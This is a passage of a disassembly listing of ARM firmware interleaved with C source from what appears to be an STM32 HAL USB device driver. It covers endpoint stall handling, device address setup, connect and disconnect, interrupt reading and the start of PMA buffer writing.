 8007fa6:	461a      	mov	r2, r3
 8007fa8:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007fac:	4413      	add	r3, r2
 8007fae:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007fb2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fb6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fba:	681b      	ldr	r3, [r3, #0]
 8007fbc:	781b      	ldrb	r3, [r3, #0]
 8007fbe:	00da      	lsls	r2, r3, #3
 8007fc0:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007fc4:	4413      	add	r3, r2
 8007fc6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007fca:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 8007fce:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007fd2:	881b      	ldrh	r3, [r3, #0]
 8007fd4:	b29b      	uxth	r3, r3
 8007fd6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007fda:	b29a      	uxth	r2, r3
 8007fdc:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007fe0:	801a      	strh	r2, [r3, #0]
 8007fe2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fe6:	2b3e      	cmp	r3, #62	; 0x3e
 8007fe8:	d923      	bls.n	8008032 <USB_EPStartXfer+0x1628>
 8007fea:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fee:	095b      	lsrs	r3, r3, #5
 8007ff0:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8007ff4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ff8:	f003 031f 	and.w	r3, r3, #31
 8007ffc:	2b00      	cmp	r3, #0
 8007ffe:	d104      	bne.n	800800a <USB_EPStartXfer+0x1600>
 8008000:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008004:	3b01      	subs	r3, #1
 8008006:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800800a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800800e:	881b      	ldrh	r3, [r3, #0]
 8008010:	b29a      	uxth	r2, r3
 8008012:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008016:	b29b      	uxth	r3, r3
 8008018:	029b      	lsls	r3, r3, #10
 800801a:	b29b      	uxth	r3, r3
 800801c:	4313      	orrs	r3, r2
 800801e:	b29b      	uxth	r3, r3
 8008020:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008024:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008028:	b29a      	uxth	r2, r3
 800802a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800802e:	801a      	strh	r2, [r3, #0]
 8008030:	e05c      	b.n	80080ec <USB_EPStartXfer+0x16e2>
 8008032:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008036:	2b00      	cmp	r3, #0
 8008038:	d10c      	bne.n	8008054 <USB_EPStartXfer+0x164a>
 800803a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800803e:	881b      	ldrh	r3, [r3, #0]
 8008040:	b29b      	uxth	r3, r3
 8008042:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008046:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800804a:	b29a      	uxth	r2, r3
 800804c:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008050:	801a      	strh	r2, [r3, #0]
 8008052:	e04b      	b.n	80080ec <USB_EPStartXfer+0x16e2>
 8008054:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008058:	085b      	lsrs	r3, r3, #1
 800805a:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800805e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008062:	f003 0301 	and.w	r3, r3, #1
 8008066:	2b00      	cmp	r3, #0
 8008068:	d004      	beq.n	8008074 <USB_EPStartXfer+0x166a>
 800806a:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800806e:	3301      	adds	r3, #1
 8008070:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008074:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008078:	881b      	ldrh	r3, [r3, #0]
 800807a:	b29a      	uxth	r2, r3
 800807c:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008080:	b29b      	uxth	r3, r3
 8008082:	029b      	lsls	r3, r3, #10
 8008084:	b29b      	uxth	r3, r3
 8008086:	4313      	orrs	r3, r2
 8008088:	b29a      	uxth	r2, r3
 800808a:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800808e:	801a      	strh	r2, [r3, #0]
 8008090:	e02c      	b.n	80080ec <USB_EPStartXfer+0x16e2>
 8008092:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008096:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800809a:	681b      	ldr	r3, [r3, #0]
 800809c:	785b      	ldrb	r3, [r3, #1]
 800809e:	2b01      	cmp	r3, #1
 80080a0:	d124      	bne.n	80080ec <USB_EPStartXfer+0x16e2>
 80080a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080a6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80080aa:	681b      	ldr	r3, [r3, #0]
 80080ac:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80080b0:	b29b      	uxth	r3, r3
 80080b2:	461a      	mov	r2, r3
 80080b4:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80080b8:	4413      	add	r3, r2
 80080ba:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 80080be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080c6:	681b      	ldr	r3, [r3, #0]
 80080c8:	781b      	ldrb	r3, [r3, #0]
 80080ca:	00da      	lsls	r2, r3, #3
 80080cc:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80080d0:	4413      	add	r3, r2
 80080d2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80080d6:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 80080da:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080de:	b29a      	uxth	r2, r3
 80080e0:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 80080e4:	801a      	strh	r2, [r3, #0]
 80080e6:	e001      	b.n	80080ec <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 80080e8:	2301      	movs	r3, #1
 80080ea:	e03a      	b.n	8008162 <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80080ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080f0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80080f4:	681a      	ldr	r2, [r3, #0]
 80080f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080fe:	681b      	ldr	r3, [r3, #0]
 8008100:	781b      	ldrb	r3, [r3, #0]
 8008102:	009b      	lsls	r3, r3, #2
 8008104:	4413      	add	r3, r2
 8008106:	881b      	ldrh	r3, [r3, #0]
 8008108:	b29b      	uxth	r3, r3
 800810a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800810e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008112:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008116:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800811a:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800811e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008122:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008126:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800812a:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800812e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008132:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008136:	681a      	ldr	r2, [r3, #0]
 8008138:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800813c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008140:	681b      	ldr	r3, [r3, #0]
 8008142:	781b      	ldrb	r3, [r3, #0]
 8008144:	009b      	lsls	r3, r3, #2
 8008146:	441a      	add	r2, r3
 8008148:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800814c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008150:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008154:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008158:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800815c:	b29b      	uxth	r3, r3
 800815e:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008160:	2300      	movs	r3, #0
}
 8008162:	4618      	mov	r0, r3
 8008164:	f507 7784 	add.w	r7, r7, #264	; 0x108
 8008168:	46bd      	mov	sp, r7
 800816a:	bd80      	pop	{r7, pc}

0800816c <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800816c:	b480      	push	{r7}
 800816e:	b085      	sub	sp, #20
 8008170:	af00      	add	r7, sp, #0
 8008172:	6078      	str	r0, [r7, #4]
 8008174:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 8008176:	683b      	ldr	r3, [r7, #0]
 8008178:	785b      	ldrb	r3, [r3, #1]
 800817a:	2b00      	cmp	r3, #0
 800817c:	d020      	beq.n	80081c0 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 800817e:	687a      	ldr	r2, [r7, #4]
 8008180:	683b      	ldr	r3, [r7, #0]
 8008182:	781b      	ldrb	r3, [r3, #0]
 8008184:	009b      	lsls	r3, r3, #2
 8008186:	4413      	add	r3, r2
 8008188:	881b      	ldrh	r3, [r3, #0]
 800818a:	b29b      	uxth	r3, r3
 800818c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008190:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008194:	81bb      	strh	r3, [r7, #12]
 8008196:	89bb      	ldrh	r3, [r7, #12]
 8008198:	f083 0310 	eor.w	r3, r3, #16
 800819c:	81bb      	strh	r3, [r7, #12]
 800819e:	687a      	ldr	r2, [r7, #4]
 80081a0:	683b      	ldr	r3, [r7, #0]
 80081a2:	781b      	ldrb	r3, [r3, #0]
 80081a4:	009b      	lsls	r3, r3, #2
 80081a6:	441a      	add	r2, r3
 80081a8:	89bb      	ldrh	r3, [r7, #12]
 80081aa:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081ae:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081b2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081b6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80081ba:	b29b      	uxth	r3, r3
 80081bc:	8013      	strh	r3, [r2, #0]
 80081be:	e01f      	b.n	8008200 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 80081c0:	687a      	ldr	r2, [r7, #4]
 80081c2:	683b      	ldr	r3, [r7, #0]
 80081c4:	781b      	ldrb	r3, [r3, #0]
 80081c6:	009b      	lsls	r3, r3, #2
 80081c8:	4413      	add	r3, r2
 80081ca:	881b      	ldrh	r3, [r3, #0]
 80081cc:	b29b      	uxth	r3, r3
 80081ce:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80081d2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80081d6:	81fb      	strh	r3, [r7, #14]
 80081d8:	89fb      	ldrh	r3, [r7, #14]
 80081da:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80081de:	81fb      	strh	r3, [r7, #14]
 80081e0:	687a      	ldr	r2, [r7, #4]
 80081e2:	683b      	ldr	r3, [r7, #0]
 80081e4:	781b      	ldrb	r3, [r3, #0]
 80081e6:	009b      	lsls	r3, r3, #2
 80081e8:	441a      	add	r2, r3
 80081ea:	89fb      	ldrh	r3, [r7, #14]
 80081ec:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081f0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081f4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081f8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80081fc:	b29b      	uxth	r3, r3
 80081fe:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008200:	2300      	movs	r3, #0
}
 8008202:	4618      	mov	r0, r3
 8008204:	3714      	adds	r7, #20
 8008206:	46bd      	mov	sp, r7
 8008208:	f85d 7b04 	ldr.w	r7, [sp], #4
 800820c:	4770      	bx	lr

0800820e <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800820e:	b480      	push	{r7}
 8008210:	b087      	sub	sp, #28
 8008212:	af00      	add	r7, sp, #0
 8008214:	6078      	str	r0, [r7, #4]
 8008216:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8008218:	683b      	ldr	r3, [r7, #0]
 800821a:	7b1b      	ldrb	r3, [r3, #12]
 800821c:	2b00      	cmp	r3, #0
 800821e:	f040 809d 	bne.w	800835c <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 8008222:	683b      	ldr	r3, [r7, #0]
 8008224:	785b      	ldrb	r3, [r3, #1]
 8008226:	2b00      	cmp	r3, #0
 8008228:	d04c      	beq.n	80082c4 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800822a:	687a      	ldr	r2, [r7, #4]
 800822c:	683b      	ldr	r3, [r7, #0]
 800822e:	781b      	ldrb	r3, [r3, #0]
 8008230:	009b      	lsls	r3, r3, #2
 8008232:	4413      	add	r3, r2
 8008234:	881b      	ldrh	r3, [r3, #0]
 8008236:	823b      	strh	r3, [r7, #16]
 8008238:	8a3b      	ldrh	r3, [r7, #16]
 800823a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800823e:	2b00      	cmp	r3, #0
 8008240:	d01b      	beq.n	800827a <USB_EPClearStall+0x6c>
 8008242:	687a      	ldr	r2, [r7, #4]
 8008244:	683b      	ldr	r3, [r7, #0]
 8008246:	781b      	ldrb	r3, [r3, #0]
 8008248:	009b      	lsls	r3, r3, #2
 800824a:	4413      	add	r3, r2
 800824c:	881b      	ldrh	r3, [r3, #0]
 800824e:	b29b      	uxth	r3, r3
 8008250:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008254:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008258:	81fb      	strh	r3, [r7, #14]
 800825a:	687a      	ldr	r2, [r7, #4]
 800825c:	683b      	ldr	r3, [r7, #0]
 800825e:	781b      	ldrb	r3, [r3, #0]
 8008260:	009b      	lsls	r3, r3, #2
 8008262:	441a      	add	r2, r3
 8008264:	89fb      	ldrh	r3, [r7, #14]
 8008266:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800826a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800826e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008272:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8008276:	b29b      	uxth	r3, r3
 8008278:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 800827a:	683b      	ldr	r3, [r7, #0]
 800827c:	78db      	ldrb	r3, [r3, #3]
 800827e:	2b01      	cmp	r3, #1
 8008280:	d06c      	beq.n	800835c <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8008282:	687a      	ldr	r2, [r7, #4]
 8008284:	683b      	ldr	r3, [r7, #0]
 8008286:	781b      	ldrb	r3, [r3, #0]
 8008288:	009b      	lsls	r3, r3, #2
 800828a:	4413      	add	r3, r2
 800828c:	881b      	ldrh	r3, [r3, #0]
 800828e:	b29b      	uxth	r3, r3
 8008290:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008294:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008298:	81bb      	strh	r3, [r7, #12]
 800829a:	89bb      	ldrh	r3, [r7, #12]
 800829c:	f083 0320 	eor.w	r3, r3, #32
 80082a0:	81bb      	strh	r3, [r7, #12]
 80082a2:	687a      	ldr	r2, [r7, #4]
 80082a4:	683b      	ldr	r3, [r7, #0]
 80082a6:	781b      	ldrb	r3, [r3, #0]
 80082a8:	009b      	lsls	r3, r3, #2
 80082aa:	441a      	add	r2, r3
 80082ac:	89bb      	ldrh	r3, [r7, #12]
 80082ae:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80082b2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80082b6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80082ba:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80082be:	b29b      	uxth	r3, r3
 80082c0:	8013      	strh	r3, [r2, #0]
 80082c2:	e04b      	b.n	800835c <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80082c4:	687a      	ldr	r2, [r7, #4]
 80082c6:	683b      	ldr	r3, [r7, #0]
 80082c8:	781b      	ldrb	r3, [r3, #0]
 80082ca:	009b      	lsls	r3, r3, #2
 80082cc:	4413      	add	r3, r2
 80082ce:	881b      	ldrh	r3, [r3, #0]
 80082d0:	82fb      	strh	r3, [r7, #22]
 80082d2:	8afb      	ldrh	r3, [r7, #22]
 80082d4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80082d8:	2b00      	cmp	r3, #0
 80082da:	d01b      	beq.n	8008314 <USB_EPClearStall+0x106>
 80082dc:	687a      	ldr	r2, [r7, #4]
 80082de:	683b      	ldr	r3, [r7, #0]
 80082e0:	781b      	ldrb	r3, [r3, #0]
 80082e2:	009b      	lsls	r3, r3, #2
 80082e4:	4413      	add	r3, r2
 80082e6:	881b      	ldrh	r3, [r3, #0]
 80082e8:	b29b      	uxth	r3, r3
 80082ea:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80082ee:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80082f2:	82bb      	strh	r3, [r7, #20]
 80082f4:	687a      	ldr	r2, [r7, #4]
 80082f6:	683b      	ldr	r3, [r7, #0]
 80082f8:	781b      	ldrb	r3, [r3, #0]
 80082fa:	009b      	lsls	r3, r3, #2
 80082fc:	441a      	add	r2, r3
 80082fe:	8abb      	ldrh	r3, [r7, #20]
 8008300:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008304:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008308:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800830c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008310:	b29b      	uxth	r3, r3
 8008312:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008314:	687a      	ldr	r2, [r7, #4]
 8008316:	683b      	ldr	r3, [r7, #0]
 8008318:	781b      	ldrb	r3, [r3, #0]
 800831a:	009b      	lsls	r3, r3, #2
 800831c:	4413      	add	r3, r2
 800831e:	881b      	ldrh	r3, [r3, #0]
 8008320:	b29b      	uxth	r3, r3
 8008322:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008326:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800832a:	827b      	strh	r3, [r7, #18]
 800832c:	8a7b      	ldrh	r3, [r7, #18]
 800832e:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008332:	827b      	strh	r3, [r7, #18]
 8008334:	8a7b      	ldrh	r3, [r7, #18]
 8008336:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800833a:	827b      	strh	r3, [r7, #18]
 800833c:	687a      	ldr	r2, [r7, #4]
 800833e:	683b      	ldr	r3, [r7, #0]
 8008340:	781b      	ldrb	r3, [r3, #0]
 8008342:	009b      	lsls	r3, r3, #2
 8008344:	441a      	add	r2, r3
 8008346:	8a7b      	ldrh	r3, [r7, #18]
 8008348:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800834c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008350:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008354:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008358:	b29b      	uxth	r3, r3
 800835a:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 800835c:	2300      	movs	r3, #0
}
 800835e:	4618      	mov	r0, r3
 8008360:	371c      	adds	r7, #28
 8008362:	46bd      	mov	sp, r7
 8008364:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008368:	4770      	bx	lr

0800836a <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 800836a:	b480      	push	{r7}
 800836c:	b083      	sub	sp, #12
 800836e:	af00      	add	r7, sp, #0
 8008370:	6078      	str	r0, [r7, #4]
 8008372:	460b      	mov	r3, r1
 8008374:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 8008376:	78fb      	ldrb	r3, [r7, #3]
 8008378:	2b00      	cmp	r3, #0
 800837a:	d103      	bne.n	8008384 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 800837c:	687b      	ldr	r3, [r7, #4]
 800837e:	2280      	movs	r2, #128	; 0x80
 8008380:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 8008384:	2300      	movs	r3, #0
}
 8008386:	4618      	mov	r0, r3
 8008388:	370c      	adds	r7, #12
 800838a:	46bd      	mov	sp, r7
 800838c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008390:	4770      	bx	lr

08008392 <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 8008392:	b480      	push	{r7}
 8008394:	b083      	sub	sp, #12
 8008396:	af00      	add	r7, sp, #0
 8008398:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 800839a:	687b      	ldr	r3, [r7, #4]
 800839c:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80083a0:	b29b      	uxth	r3, r3
 80083a2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80083a6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80083aa:	b29a      	uxth	r2, r3
 80083ac:	687b      	ldr	r3, [r7, #4]
 80083ae:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80083b2:	2300      	movs	r3, #0
}
 80083b4:	4618      	mov	r0, r3
 80083b6:	370c      	adds	r7, #12
 80083b8:	46bd      	mov	sp, r7
 80083ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083be:	4770      	bx	lr

080083c0 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 80083c0:	b480      	push	{r7}
 80083c2:	b083      	sub	sp, #12
 80083c4:	af00      	add	r7, sp, #0
 80083c6:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 80083c8:	687b      	ldr	r3, [r7, #4]
 80083ca:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80083ce:	b29b      	uxth	r3, r3
 80083d0:	f3c3 030e 	ubfx	r3, r3, #0, #15
 80083d4:	b29a      	uxth	r2, r3
 80083d6:	687b      	ldr	r3, [r7, #4]
 80083d8:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80083dc:	2300      	movs	r3, #0
}
 80083de:	4618      	mov	r0, r3
 80083e0:	370c      	adds	r7, #12
 80083e2:	46bd      	mov	sp, r7
 80083e4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083e8:	4770      	bx	lr

080083ea <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 80083ea:	b480      	push	{r7}
 80083ec:	b085      	sub	sp, #20
 80083ee:	af00      	add	r7, sp, #0
 80083f0:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 80083f2:	687b      	ldr	r3, [r7, #4]
 80083f4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80083f8:	b29b      	uxth	r3, r3
 80083fa:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 80083fc:	68fb      	ldr	r3, [r7, #12]
}
 80083fe:	4618      	mov	r0, r3
 8008400:	3714      	adds	r7, #20
 8008402:	46bd      	mov	sp, r7
 8008404:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008408:	4770      	bx	lr

0800840a <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 800840a:	b480      	push	{r7}
 800840c:	b083      	sub	sp, #12
 800840e:	af00      	add	r7, sp, #0
 8008410:	6078      	str	r0, [r7, #4]
 8008412:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8008414:	2300      	movs	r3, #0
}
 8008416:	4618      	mov	r0, r3
 8008418:	370c      	adds	r7, #12
 800841a:	46bd      	mov	sp, r7
 800841c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008420:	4770      	bx	lr

08008422 <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008422:	b480      	push	{r7}
 8008424:	b08b      	sub	sp, #44	; 0x2c
 8008426:	af00      	add	r7, sp, #0
 8008428:	60f8      	str	r0, [r7, #12]
 800842a:	60b9      	str	r1, [r7, #8]
 800842c:	4611      	mov	r1, r2
 800842e:	461a      	mov	r2, r3
 8008430:	460b      	mov	r3, r1
 8008432:	80fb      	strh	r3, [r7, #6]
 8008434:	4613      	mov	r3, r2
 8008436:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 8008438:	88bb      	ldrh	r3, [r7, #4]
 800843a:	3301      	adds	r3, #1
 800843c:	085b      	lsrs	r3, r3, #1
 800843e:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008440:	68fb      	ldr	r3, [r7, #12]
 8008442:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008444:	68bb      	ldr	r3, [r7, #8]
 8008446:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 8008448:	88fa      	ldrh	r2, [r7, #6]
 800844a:	697b      	ldr	r3, [r7, #20]
 800844c:	4413      	add	r3, r2
 800844e:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008452:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008454:	69bb      	ldr	r3, [r7, #24]
 8008456:	627b      	str	r3, [r7, #36]	; 0x24
 8008458:	e01b      	b.n	8008492 <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 800845a:	69fb      	ldr	r3, [r7, #28]
 800845c:	781b      	ldrb	r3, [r3, #0]
 800845e:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 8008460:	69fb      	ldr	r3, [r7, #28]
 8008462:	3301      	adds	r3, #1
 8008464:	781b      	ldrb	r3, [r3, #0]
 8008466:	021b      	lsls	r3, r3, #8
 8008468:	b21a      	sxth	r2, r3
